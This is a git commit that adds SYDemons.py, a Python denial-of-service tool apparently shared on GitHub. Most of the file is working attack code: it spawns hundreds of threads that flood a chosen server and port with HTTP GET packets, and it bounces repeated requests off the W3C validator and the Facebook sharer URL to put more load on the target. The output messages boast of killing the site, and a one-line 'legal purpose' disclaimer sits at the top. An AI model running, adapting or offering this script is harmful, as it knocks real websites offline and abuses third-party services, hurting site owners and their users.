1fefdea600a4232ed1727a0e41e575f72859627e
ahuraDemon <43513025+ahuraDemon@users.noreply.github.com>
2018-09-23 21:37:42 +0330

    Create SYDemons.py

---
+++ SYDemons.py
@@ -0,0 +1,329 @@
+#!/usr/bin/python3
+
+# -*- coding: utf-8 -*-
+
+
+# python 3 SynDemons dos Script v.1-alpha
+
+# by Ahura
+
+# only for legal purpose
+
+#This script is created with love in IRAN
+
+#
+
+
+
+from queue import Queue
+
+from optparse import OptionParser
+
+import time,sys,socket,threading,logging,urllib.request,random
+
+
+def user_agent():
+
+	global uagent
+
+	uagent=[]
+
+	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+
+	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
+
+	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+
+	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
+
+	return(uagent)
+
+
+
+def my_bots():
+
+	global bots
+
+	bots=[]
+
+	bots.append("http://validator.w3.org/check?uri=")
+
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+
+	return(bots)
+
+
+
+def Demon_Killing(url):
+
+	try:
+
+		while True:
+
+			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
+
+			print("\x1b[39mTesting The Site...\x1b[31m")
+
+			time.sleep(.1)
+
+	except:
+
+		time.sleep(.1)
+
+
+
+def down_it(item):
+
+	try:
+
+		while True:
+
+			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+			s.connect((host,int(port)))
+
+			if s.sendto( packet, (host, int(port)) ):
+
+				s.shutdown(1)
+
+				print ("\x1b[77m \x1b[77m Demons Attacked him \x1b[39m")
+
+			else:
+
+				s.shutdown(1)
+
+				print("\x1b[91mshut<->down\x1b[31m")
+
+			time.sleep(.1)
+
+	except socket.error as e:
+
+		print("\x1b[91Website is down no ping recieved Demons Killed \x1b[32m")
+
+		#print("\033[91m",e,"\033[0m")
+
+		time.sleep(.1)
+
+
+
+def dos():
+
+	while True:
+
+		item = q.get()
+
+		down_it(item)
+
+		q.task_done()
+
+
+
+def dos2():
+
+	while True:
+
+		item=w.get()
+
+		Demon_Killing(random.choice(bots)+"http://"+host)
+
+		w.task_done()
+
+
+
+def usage():
+
+	print (''' \x1b[31m
+___________________________________
+
+█▀▀ █▀▀▄ █▀▀ █▀▄▀█ █▀▀█ █▀▀▄
+▀▀█ █░░█ █▀▀ █░▀░█ █░░█ █░░█
+▀▀▀ ▀▀▀░ ▀▀▀ ▀░░░▀ ▀▀▀▀ ▀░░▀
+___________________________________
+	New Version:
+ ~1 Stronger Bots
+	~2 Better Design 
+	~3 Stronger Than any DOS script
+	  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-
+	
+	SYNDemons dos Script v.1-Alpha by ahura
+
+Usage \Hidden/
+
+\x1b[95m''')
+
+	sys.exit()
+
+
+
+def get_parameters():
+
+	global host
+
+	global port
+
+	global thr
+
+	global item
+
+	optp = OptionParser(add_help_option=False,epilog="Demons")
+
+	optp.add_option("--quiet","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
+
+	optp.add_option("--server","--server", dest="host",help="attack to server ip")
+
+	optp.add_option("--port","--port",type="int",dest="port",help="-p 80 default 80")
+
+	optp.add_option("--thread","--turbo",type="int",dest="turbo",help="default 500 -t 900")
+
+	optp.add_option("--help","--help",dest="help",action='store_true',help="help you")
+
+	opts, args = optp.parse_args()
+
+	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
+
+	if opts.help:
+
+		usage()
+
+	if opts.host is not None:
+
+		host = opts.host
+
+	else:
+
+		usage()
+
+	if opts.port is None:
+
+		port = 80
+
+	else:
+
+		port = opts.port
+
+	if opts.turbo is None:
+
+		thr = 500
+
+	else:
+
+		thr = opts.turbo
+
+
+
+# reading headers
+
+global data
+
+headers = open("headers.txt", "r")
+
+data = headers.read()
+
+headers.close()
+
+#task queue are q,w
+
+q = Queue()
+
+w = Queue()
+
+
+
+if __name__ == '__main__':
+
+	if len(sys.argv) < 2:
+
+		usage()
+
+	get_parameters()
+
+	print("\x1b[31m",host," port ",str(port)," thread ",str(thr),"\x1b[31m")
+
+	print (''' \x1b[31m
+___________________________________
+
+█▀▀ █▀▀▄ █▀▀ █▀▄▀█ █▀▀█ █▀▀▄
+▀▀█ █░░█ █▀▀ █░▀░█ █░░█ █░░█
+▀▀▀ ▀▀▀░ ▀▀▀ ▀░░░▀ ▀▀▀▀ ▀░░▀
+___________________________________
+	New Version:
+ ~1 Stronger Bots
+	~2 Better Design 
+	~3 Stronger Than any DOS script
+	  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-
+	
+	SYNDemons dos Script v.1-Alpha by ahura
+
+Usage \Hidden/
+
+\x1b[95m''')
+
+	user_agent()
+
+	my_bots()
+
+	time.sleep(5)
+
+	try:
+
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+		s.connect((host,int(port)))
+
+		s.settimeout(1)
+
+	except socket.error as e:
+
+		print("\x1b[91mserver offe ya ipt block shde\x1b[38m")
+
+		usage()
+
+	while True:
+
+		for i in range(int(thr)):
+
+			t = threading.Thread(target=dos)
+
+			t.daemon = True # if thread is exist, it dies
+
+			t.start()
+
+			t2 = threading.Thread(target=dos2)
+
+			t2.daemon = True # if thread is exist, it dies
+
+			t2.start()
+
+		start = time.time()
+
+		#tas
+		
+
+		item = 0
+
+		while True:
+
+			if (item>1800): # for no memory crash
+
+				item=0
+
+				time.sleep(.1)
+
+			item = item + 1
+
+			q.put(item)
+
+			w.put(item)
+
+		q.join()
+
+		w.join()
+
